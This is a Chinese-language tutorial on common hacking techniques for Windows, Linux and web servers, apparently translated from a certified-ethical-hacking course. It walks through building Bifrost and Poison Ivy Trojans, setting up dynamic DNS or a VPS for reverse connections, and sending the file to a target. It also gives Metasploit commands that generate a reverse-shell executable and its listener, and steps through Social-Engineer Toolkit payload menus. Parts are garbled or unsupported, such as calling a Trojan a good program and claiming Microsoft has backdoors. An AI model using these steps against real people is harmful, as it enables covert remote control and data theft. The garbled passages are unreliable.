
# Windows、Linux 和 Web 服务器系统常见黑客技术

![](img/91b4da451291288ee84ff207e23ccb97_0_0.png)

**作者**

Hidaia Mahmood Alassouli 博士

`Hidaia_alassouli@hotmail.com`

## 1. 引言

木马（`Trojan horse or Trojan`）是一种通常伪装成合法软件的恶意软件。网络罪犯和黑客利用木马来试图获取用户系统的访问权限。用户通常会被某些社会工程学误导，在他们的系统中加载并执行木马。一旦激活，木马就能让网络犯罪分子监视你、窃取敏感数据，并获得你系统的后门访问权限。

计算机病毒是一种计算机程序，在执行时会通过修改其他计算机程序并插入自己的代码来复制自己。如果这种复制成功，受影响的区域就被认为“感染”了计算机病毒。计算机病毒通常需要一个宿主程序。

系统攻击定义为破坏计算机系统和软件以访问目标计算机并窃取或误用其敏感信息。恶意黑客利用计算机系统或网络中的漏洞来获取未经授权的数据访问权限或获取非法利益。

`Web` 内容是由运行在服务器端的软件应用程序实时生成的。因此，黑客攻击 `Web` 服务器，通过使用 `DoS`（`DDoS`）攻击、`SYN` 洪水、`Ping` 洪水、端口洪水扫描、嗅探攻击和社会工程学攻击来窃取凭据信息、密码和业务信息。

本报告涵盖了用于系统、`Windows`、`Linux` 和 `Web` 服务器攻击的常用技术和工具。报告包含以下内容：

你可以从以下网站下载所有的攻击工具和材料：

`http://www.hxf4rall.com/2016/02/13/ceh-v9-pdf-certified-ethical-hacker-v9-courseeducational-materials-tools/`

`www.mediafire.com%2FFolder%2Fad5szsted5end%2FEduors_Professional_Ethical_Hacker&h=gAQGad5Hf`

## 2. A 部分：搭建实验室

- 通过 `VMware` 或 `VirtualBox` 等虚拟化技术软件，我们可以创建多个虚拟机，如 `Linux` 以及其他 `Windows 2007` 或 `Windows XP`。
- 下载并安装 `VMware`。
- 在非 `Windows` 分区中创建 `edors-vm` 文件夹。为每个操作系统创建一个文件夹。
- 安装任意 `Windows` 操作系统。
- 下载 `Backtrack`。

### a) 搭建实验室

![](img/91b4da451291288ee84ff207e23ccb97_3_0.png)

- 如果要在 `USB` 上安装 `Backtrack`，请下载 `unbootee`。我们还需要使用该工具来支持虚拟机从闪存启动。

![](img/91b4da451291288ee84ff207e23ccb97_3_1.png)

- 下载并安装 `Kali Linux`。

![](img/91b4da451291288ee84ff207e23ccb97_3_2.png)

- 下载并安装 `Metasploit`。

![](img/91b4da451291288ee84ff207e23ccb97_4_0.png)

`Metasploit` 是一个包含许多模块或程序的大型项目。这些模块或程序可以利用 `Windows` 或 `Linux` 操作系统中的漏洞。对于操作系统出现的任何漏洞，我们都可以开发利用该漏洞的程序。我们可以通过命令行或图形界面进行操作。使用图形界面的程序有 `Armitage` 和 `Cobalt Strike`。在 `Linux` 中，我们可以使用命令 `msfupdate` 来更新 `Metasploit`。

## 2. B 部分：木马、后门和病毒

### a) 后门

### 什么是后门？

- 后门是一种绕过安全机制访问计算机程序的手段。程序员有时会为了故障排除或其他目的而安装后门。然而，攻击者经常使用他们检测到或自行安装的后门。
- 后门是黑客安装在目标系统上的程序或一组相关程序，以便以后访问该系统。后门的目标是从系统日志文件中删除初始入侵的证据。但后门也可能让黑客在入侵已被系统管理员检测并修复后，仍然保留对被攻入机器的访问权限。

![](img/91b4da451291288ee84ff207e23ccb97_5_0.png)

后门是让我们通过它访问机器并绕过现有安全策略的后门。`微软`拥有后门，使其能够对机器进行远程访问。

### b) 木马：

![](img/91b4da451291288ee84ff207e23ccb97_6_0.png)

木马是一个好程序。

### 什么是显式通道和隐蔽通道？

显式通道（`Overt channel`）是正常的方式。隐蔽通道（`Covert channel`）是一种并非用于预期通信的信息传输方式。

（注：原文后续部分存在大量逻辑重复内容，此处已根据逻辑去重并保留核心定义翻译）

# `DUC v4.0.1`

文件编辑工具帮助

状态

客户端 ID: `C3A9845233`

`demoairdagon@hotmail.com`

更新中: `0` 组 & `1` 个主机

`IP: 41.32.91.242`

下次检查: `56` 秒后

`下午 6:56:` 发现远程 `IP: 41.32.91.242`

![](img/91b4da451291288ee84ff207e23ccb97_10_0.png)

请选择与此客户端关联的主机或组。您可以点击此处在 `No-IP.com` 网站上添加或删除账户内的主机。

`管理现有主机` `创建主机..`

`zapto.org`

`demoairdagon.zapto.org`

显示已选主机

修改主机需要密码

- `*` 您可以使用路由器中名为动态 `DNS` (`dynamic dns`) 的属性

| 动态 `DNS` | |
|---|---|
| 激活状态 | 启用 禁用 |
| 服务提供商 | |
| 主机名 | |
| 邮箱地址 | |
| 用户 | |
| 密码 | |
| 启用向导 | 启用 禁用 |

- `*` 在 `dynamicdns.com` 注册账户，并将注册信息放入路由器配置中。当路由器重启时，它将在动态 `DNS` 中注册其 `IP`。
- 我们可以使用 `VPS` 机器。`VPS` 将拥有真实 `IP`，建议直接连接互联网，并通过 `Trojan` 程序运行它。客户端中的 `Trojan` 服务器将对此真实 `IP` 建立反连接，这样真实 `IP` 就不会改变，且 `VPS` 会 24 小时在线。

### f) `Windows` `Trojan` 工具：

![](img/91b4da451291288ee84ff207e23ccb97_11_0.png)

- 下载 `bifrost`。`bifrost` 体积较小且具有多种加密方式。进行注册。
- 在路由器上进行端口转发。

![](img/91b4da451291288ee84ff207e23ccb97_11_1.png)

- 然后进入 `bifrost stub` 自定义并按照以下设置生成 `Trojan`。生成的文件将命名为 `Customized`。

![](img/91b4da451291288ee84ff207e23ccb97_12_0.png)

- 打开 `bifrost` 程序。输入动态 `DNS` 名称和 `Trojan` 程序将运行的端口号。

![](img/91b4da451291288ee84ff207e23ccb97_13_0.png)

- 在想要攻击的机器上自定义文件，我们就可以浏览该机器。

![](img/91b4da451291288ee84ff207e23ccb97_13_1.png)

- 编译程序。提供自定义器输出的 `Customized` 文件。
- 将文件发送到你想要破解的客户端。
- 当客户端访问 `Trojan` 文件时，我们将收到反连接的通知。

![](img/91b4da451291288ee84ff207e23ccb97_14_0.png)

- 在接收到的机器上选择文件管理器

![](img/91b4da451291288ee84ff207e23ccb97_14_1.png)

- 另一个程序是 `Poison` 程序

![](img/91b4da451291288ee84ff207e23ccb97_14_2.png)

- 选择新客户端。`Trojan` 程序正在监听。如果需要，请输入反连接的密码。
- `•` 新服务器在你生成它后创建配置并命名。选择反连接连接到动态 `DNS` 服务器。

![](img/91b4da451291288ee84ff207e23ccb97_15_0.png)

- 当客户端点击服务器时，我们可以看到所有信息

![](img/91b4da451291288ee84ff207e23ccb97_15_1.png)

- `•` 生成它并命名服务器。
- 当客户端访问文件时，我们在黑客应用程序中获取以下信息

专业道德黑客 (`Trojans Backdoors Vulnerabilities Part 1`) 由 `Mahmoud Ahmed - Arabic`

| ID | WLAN | LAN | 连接类型 | 计算机 | 名称 | 账户 | OS | CPU | 版本 | 创建 |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | 192.1... | 192.1... | 直接 | XP-1 | 用户 | Admin | WinV6 | 2495 MHz | 511.48 MB | 2.3 1/12/2013 33:54 |

![](img/91b4da451291288ee84ff207e23ccb97_15_2.png)

### g) `Linux` `Trojan` :

![](img/91b4da451291288ee84ff207e23ccb97_17_0.png)

- `VPS` 是一个具有真实 `IP` 地址的机器。我们可以通过 `Windows` 远程桌面连接，或通过 `Linux` 的 `SSH` 或 `VNC` 程序连接到你购买的面板。

| Linux VPS 方案 | Windows VPS 方案 | Linux VPS Pro |
|---|---|---|
| Linux VPS Plus | 30 GB 磁盘空间 | 50 GB 磁盘空间 | |
| 1024 MB RAM | 2048 MB RAM | 4096 MB RAM |
| 6144 MB Burst | 无限制流量 | 无限制流量 |
| 等效 CPU (1核) | 等效 CPU (2核) | |
| $19.95 | $29.95 | |

### h) 安装 `Metasploit`:

- 下载 `Metasploit`。你将获得文件。

![](img/91b4da451291288ee84ff207e23ccb97_18_0.png)

- 给文件执行权限。运行文件。

```
root@hmoud-virtual-machine:~/Desktop# chmod +x metasploit-latest-installer.run
root@hmoud-virtual-machine:~/Desktop# ./metasploit-latest-installer.run
```

- 安装程序。保留默认信息。
- 为了更新，你需要进行注册。你需要通过浏览器访问 `Metasploit`。

| 登录信息 | 可选信息 |
|---|---|
| 用户名 | |
| 密码 | |
| 确认密码 | |
| 全名 | |
| 邮箱地址 | |
| 组织 | |
| 时区 (GMT+02:00) | |

- 让他选择专业版 `Metasploit`。提供必要信息。

| 注册并获取你的免费 Metasploit 试用密钥 | |
|---|---|
| 表示必填字段 | |
| 名 | |
| 姓 | |
| 职位 | |
| 公司名称 | |
| 国家 | |
| 州/省 | |
| 使用类型 | |

- 工作邮箱你将在邮件中收到许可密钥，将其放入 `Metasploit` 激活。你将获得以下界面

### 激活成功

快速启动向导

你想做什么？

![](img/91b4da451291288ee84ff207e23ccb97_19_0.png)

![](img/91b4da451291288ee84ff207e23ccb97_19_1.png)

![](img/91b4da451291288ee84ff207e23ccb97_19_2.png)

### 项目列表

- 更新 `Metasploit`。
- `Metasploit` 是一个程序，通过我们可以利用某些软件的漏洞来访问机器。`Metasploit` 拥有针对不同操作系统和程序的大量 `payload`。

![](img/91b4da451291288ee84ff207e23ccb97_20_0.png)

- 查看所有类型的 `payload`

### `msfconsole`

- 我们想要创建一个在 `Windows` 机器上运行的 `payload`，这种类型是 `shell` 代码，我们使用反连接属性。
- 我们想要创建一个在 `Windows` 机器上运行的 `payload`，这种类型是 `shell` 代码，我们使用反连接属性。

```
msf> search payload/windows/shell/reverse_tcp
msf> set LHOST 192.168.52.130 (黑客机器的 ip)
msf> generate -f server.exe
```

它将在根目录下创建 `server.exe`

- 使用 `multi handler` 监听 `payload`。

```
msf> back
msf> use exploit/multi/handler
msf>set payload windows/shell/reverse_tcp
msf> set LHOST 192.168.52.130
msf> set LPORT 4444
msf> exploit -j
msf > sessions -l (查看会话)
msf > sessions -i 2

sf exploit(handler) > [Starting the handler...]
[*] Command session opened 2 (41.32.91.242:4444 -> 192.168.1.7:491) at 23-07-18 03:08:57 +0200
sf exploit(handler) > sessions -l
============================
Id Type Information
     Connection
2 shell windows Microsoft [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Desktop>dir
```

- 你可以直接创建 `payload`

```
mahmoud@hmoud-virtual-machine:-$ sudo msfpayload payload/windows/shell_reverse_tcp TCP LHOST 41.32.91.242 LPORT 4444 R=eduoders.exe
[sudo] password for mahmoud:
Invalid payload: payload/windows/shell_reverse_tcp
mahmoud@hmoud-virtual-machine:-$ $
```

- 你可以使用该工具创建 `payload`。它可以与 `Metasploit` 配合。

```
Go applications, exploitation tools, social engineering tools, social engineering toolkit, set

Set>set-toolkit
```

```
Set >se_toolkit
```

按 `1` 进行社会工程攻击。

![](img/91b4da451291288ee84ff207e23ccb97_21_0.png)

按 `4` 创建 `payload` 和监听器

- `1)` 鱼叉式钓鱼攻击向量
- `2)` 网站攻击向量
- `3)` 感染性媒介生成器
- `4)` 创建有效负载（`Payload`）和监听器（`Listener`）
- `5)` 恶意软件攻击者
- `6)` 基于 `Arduino` 的攻击向量
- `7)` 短信伪造攻击向量
- `8)` 无线访问点攻击向量
- `9)` 二维码生成器攻击向量
- `10)` `PowerShell` 攻击向量
- `11)` 第三方模块

`99)` 返回主菜单。

然后，输入监听负载的黑客电脑的 `IP`。

选择负载窗口：`windows/shell/reverse_tcp` 负载

选择使用编码

选择在端口 `4444` 监听

![](img/91b4da451291288ee84ff207e23ccb97_22_0.png)

```
set:encoding>1

set:payloads> PORT of the listener [443]:4444
```
